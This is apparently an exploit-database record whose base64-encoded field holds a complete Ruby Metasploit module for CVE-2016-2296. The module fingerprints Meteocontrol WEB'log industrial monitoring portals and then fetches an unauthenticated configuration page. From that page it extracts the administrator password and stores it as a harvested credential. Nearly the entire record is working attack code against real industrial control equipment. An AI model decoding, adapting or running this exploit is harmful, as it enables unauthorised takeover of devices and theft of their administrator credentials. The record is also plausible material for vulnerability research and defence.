{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBbTWV0ZW9jb250cm9sIFdFQidsb2cgLSBFeHRyYWN0IEFkbWluIHBhc3N3b3JkXQ0KIyBEaXNjb3ZlcmVkIGJ5OiBLYXJuIEdhbmVzaGVuDQojIFZlbmRvciBIb21lcGFnZTogW2h0dHA6Ly93d3cubWV0ZW9jb250cm9sLmNvbS9lbi9dDQojIFZlcnNpb25zIFJlcG9ydGVkOiBbQWxsIE1ldGVvY29udHJvbCBXRUInbG9nIHZlcnNpb25zXQ0KIyBDVkUtSUQ6IFtDVkUtMjAxNi0yMjk2XQ0KDQojIE1ldGVvY29udHJvbCBXRUInbG9nIC0gTWV0YXNwbG9pdCBBdXhpbGlhcnkgTW9kdWxlIFttb2R1bGVzL2F1eGlsaWFyeS9hZG1pbi9zY2FkYS9tZXRlb2NvbnRyb2xfd2VibG9nX2xvZ2luLnJiXQ0KDQoNCiMjDQojIFRoaXMgbW9kdWxlIHJlcXVpcmVzIE1ldGFzcGxvaXQ6IGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9kb3dubG9hZA0KIyBDdXJyZW50IHNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yaw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXRNb2R1bGUgPCBNc2Y6OkF1eGlsaWFyeQ0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwQ2xpZW50DQogIGluY2x1ZGUgTXNmOjpBdXhpbGlhcnk6OlJlcG9ydA0KICBpbmNsdWRlIE1zZjo6QXV4aWxpYXJ5OjpTY2FubmVyDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICA9PiAnTWV0ZW9jb250cm9sIFdFQkxvZyBQYXNzd29yZCBFeHRyYWN0b3InLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyA9PiAlew0KVGhpcyBtb2R1bGUgZXhwbG9pdHMgYW4gYXV0aGVudGljYXRpb24gYnlwYXNzIHZ1bG5lcmFiaWxpdHkgaW4gTWV0ZW9jb250cm9sIFdFQkxvZyAoYWxsIG1vZGVscykuIFRoaXMgdnVsbmVyYWJpbGl0eSBhbGxvd3MgZXh0cmFjdGluZyBBZG1pbmlzdHJhdG9yIHBhc3N3b3JkIGZvciB0aGUgZGV2aWNlIG1hbmFnZW1lbnQgcG9ydGFsLg0KDQp9LA0KICAgICAgJ1JlZmVyZW5jZXMnICA9Pg0KICAgICAgICBbDQogICAgICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9pcG9zaXRpdmVzZWN1cml0eS5ibG9nc3BvdC5pbi8yMDE2LzA1L2ljcy1tZXRlb2NvbnRyb2wtd2VibG9nLXNlY3VyaXR5Lmh0bWwnIF0sDQogICAgICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vaWNzLWNlcnQudXMtY2VydC5nb3YvYWR2aXNvcmllcy9JQ1NBLTE2LTEzMy0wMScgXQ0KICAgICAgICBdLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ0thcm4gR2FuZXNoZW4gPEthcm5HYW5lc2hlblthdF1nbWFpbC5jb20+JywNCiAgICAgICAgXSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UNCiAgICApKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICBbDQogICAgICAgIE9wdDo6UlBPUlQoODA4MCkJIyBBcHBsaWNhdGlvbiBtYXkgcnVuIG9uIGEgZGlmZmVyZW50IHBvcnQgdG9vLiBDaGFuZ2UgcG9ydCBhY2NvcmRpbmdseS4NCiAgICBdLCBzZWxmLmNsYXNzKQ0KICBlbmQNCg0KICBkZWYgcnVuX2hvc3QoaXApDQogICAgdW5sZXNzIGlzX2FwcF9tZXR3ZWJsb2c/DQogICAgICByZXR1cm4NCiAgICBlbmQNCg0KICAgIGRvX2V4dHJhY3QNCiAgZW5kDQoNCiAgIw0KICAjIENoZWNrIGlmIEFwcCBpcyBNZXRlb2NvbnRyb2wgV0VCbG9nDQogICMNCg0KICBkZWYgaXNfYXBwX21ldHdlYmxvZz8NCiAgICBiZWdpbg0KICAgICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgIHsNCiAgICAgICAgJ3VyaScgICAgICAgPT4gJy9odG1sL2VuL2luZGV4Lmh0bWwnLA0KICAgICAgICAnbWV0aG9kJyAgICA9PiAnR0VUJw0KICAgICAgfSkNCiAgICByZXNjdWUgOjpSZXg6OkNvbm5lY3Rpb25SZWZ1c2VkLCA6OlJleDo6SG9zdFVucmVhY2hhYmxlLCA6OlJleDo6Q29ubmVjdGlvblRpbWVvdXQsIDo6UmV4OjpDb25uZWN0aW9uRXJyb3INCiAgICAgIHByaW50X2Vycm9yKCIje3Job3N0fToje3Jwb3J0fSAtIEhUVFAgQ29ubmVjdGlvbiBGYWlsZWQuLi4iKQ0KICAgICAgcmV0dXJuIGZhbHNlDQogICAgZW5kDQoNCiAgICBpZiAocmVzIGFuZCByZXMuY29kZSA9PSAyMDAgYW5kIChyZXMuaGVhZGVyc1snU2VydmVyJ10uaW5jbHVkZT8oIklTMiBXZWIgU2VydmVyIikgb3IgcmVzLmJvZHkuaW5jbHVkZT8oIldFQidsb2ciKSkpDQogICAgICBwcmludF9nb29kKCIje3Job3N0fToje3Jwb3J0fSAtIFJ1bm5pbmcgTWV0ZW9jb250cm9sIFdFQmxvZyBtYW5hZ2VtZW50IHBvcnRhbC4uLiIpDQogICAgICByZXR1cm4gdHJ1ZQ0KICAgIGVsc2UNCiAgICAgIHByaW50X2Vycm9yKCIje3Job3N0fToje3Jwb3J0fSAtIEFwcGxpY2F0aW9uIGRvZXMgbm90IGFwcGVhciB0byBiZSBNZXRlb2NvbnRyb2wgV0VCbG9nLiBNb2R1bGUgd2lsbCBub3QgY29udGludWUuIikNCiAgICAgIHJldHVybiBmYWxzZQ0KICAgIGVuZA0KICBlbmQNCg0KICAjDQogICMgRXh0cmFjdCBBZG1pbmlzdHJhdG9yIFBhc3N3b3JkDQogICMNCg0KICBkZWYgZG9fZXh0cmFjdCgpDQogICAgcHJpbnRfc3RhdHVzKCIje3Job3N0fToje3Jwb3J0fSAtIEF0dGVtcHRpbmcgdG8gZXh0cmFjdCBBZG1pbmlzdHJhdG9yIHBhc3N3b3JkIikNCiAgICBiZWdpbg0KICAgICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgIHsNCiAgICAgICAgJ3VyaScgICAgICAgPT4gJy9odG1sL2VuL2NvbmZBY2Nlc3NQcm90Lmh0bWwnLA0KICAgICAgICAnbWV0aG9kJyAgICA9PiAnR0VUJw0KICAgICAgfSkNCg0KICAgIHJlc2N1ZSA6OlJleDo6Q29ubmVjdGlvblJlZnVzZWQsIDo6UmV4OjpIb3N0VW5yZWFjaGFibGUsIDo6UmV4OjpDb25uZWN0aW9uVGltZW91dCwgOjpSZXg6OkNvbm5lY3Rpb25FcnJvciwgOjpFcnJubzo6RVBJUEUNCiAgICAgIHByaW50X2Vycm9yKCIje3Job3N0fToje3Jwb3J0fSAtIEhUVFAgQ29ubmVjdGlvbiBGYWlsZWQuLi4iKQ0KICAgICAgcmV0dXJuIDphYm9ydA0KICAgIGVuZA0KDQogICAgaWYgKHJlcyBhbmQgcmVzLmNvZGUgPT0gMjAwIGFuZCByZXMuYm9keS5pbmNsdWRlPygic3pXZWJBZG1pblBhc3N3b3JkIikgb3IgcmVzLmJvZHk9fiAvQWRtaW4gTW9uaXRvcmluZy8pDQogICAgICAgIGdldF9hZG1pbl9wYXNzd29yZCA9IHJlcy5ib2R5Lm1hdGNoKC9uYW1lPSJzeldlYkFkbWluUGFzc3dvcmQiIHZhbHVlPSIoLio/KSIvKQ0KICAgICAgICBhZG1pbl9wYXNzd29yZCA9IGdldF9hZG1pbl9wYXNzd29yZFsxXQ0KICAgICAgICBwcmludF9nb29kKCIje3Job3N0fToje3Jwb3J0fSAtIFBhc3N3b3JkIGlzICN7YWRtaW5fcGFzc3dvcmR9IikNCiAgICAgICAgcmVwb3J0X2NyZWQoDQogICAgICAgICAgICAgICAgaXA6IHJob3N0LA0KICAgICAgICAgICAgICAgIHBvcnQ6IHJwb3J0LA0KICAgICAgICAgICAgICAgIHNlcnZpY2VfbmFtZTogJ01ldGVvY29udHJvbCBXRUJsb2cgTWFuYWdlbWVudCBQb3J0YWwnLA0KICAgICAgICAgICAgICAgIHBhc3N3b3JkOiBhZG1pbl9wYXNzd29yZCwNCiAgICAgICAgICAgICAgICBwcm9vZjogcmVzLmJvZHkNCiAgICAgICkNCiAgICBlbHNlDQogICAgICAgICMgSW4gc29tZSBtb2RlbHMsICdXZWJzaXRlIHBhc3N3b3JkJyBwYWdlIGlzIHJlbmFtZWQgb3Igbm90IHByZXNlbnQuIFRoZXJlZm9yZSwgcGFzc3dvcmQgY2FuIG5vdCBiZSBleHRyYWN0ZWQuIFRyeSBsb2dpbiBtYW51YWxseSBpbiBzdWNoIGNhc2VzLg0KICAgICAgICBwcmludF9lcnJvcigiUGFzc3dvcmQgbm90IGZvdW5kLiBDaGVjayBsb2dpbiBtYW51YWxseS4iKQ0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgcmVwb3J0X2NyZWQob3B0cykNCiAgICBzZXJ2aWNlX2RhdGEgPSB7DQogICAgICBhZGRyZXNzOiBvcHRzWzppcF0sDQogICAgICBwb3J0OiBvcHRzWzpwb3J0XSwNCiAgICAgIHNlcnZpY2VfbmFtZTogb3B0c1s6c2VydmljZV9uYW1lXSwNCiAgICAgIHByb3RvY29sOiAndGNwJywNCiAgICAgIHdvcmtzcGFjZV9pZDogbXl3b3Jrc3BhY2VfaWQNCiAgICB9DQoNCiAgICBjcmVkZW50aWFsX2RhdGEgPSB7DQogICAgICBvcmlnaW5fdHlwZTogOnNlcnZpY2UsDQogICAgICBtb2R1bGVfZnVsbG5hbWU6IGZ1bGxuYW1lLA0KICAgICAgdXNlcm5hbWU6IG9wdHNbOnVzZXJdLA0KICAgICAgcHJpdmF0ZV9kYXRhOiBvcHRzWzpwYXNzd29yZF0sDQogICAgICBwcml2YXRlX3R5cGU6IDpwYXNzd29yZA0KICAgIH0ubWVyZ2Uoc2VydmljZV9kYXRhKQ0KDQogICAgbG9naW5fZGF0YSA9IHsNCiAgICAgIGxhc3RfYXR0ZW1wdGVkX2F0OiBUaW1lLm5vdywNCiAgICAgIGNvcmU6IGNyZWF0ZV9jcmVkZW50aWFsKGNyZWRlbnRpYWxfZGF0YSksDQogICAgICBzdGF0dXM6IE1ldGFzcGxvaXQ6Ok1vZGVsOjpMb2dpbjo6U3RhdHVzOjpTVUNDRVNTRlVMLA0KICAgICAgcHJvb2Y6IG9wdHNbOnByb29mXQ0KICAgIH0ubWVyZ2Uoc2VydmljZV9kYXRhKQ0KDQogICAgY3JlYXRlX2NyZWRlbnRpYWxfbG9naW4obG9naW5fZGF0YSkNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/multiple/webapps/39822.rb", 
    "id": "39822", 
    "cves": [
        "CVE-2016-2296"
    ]
}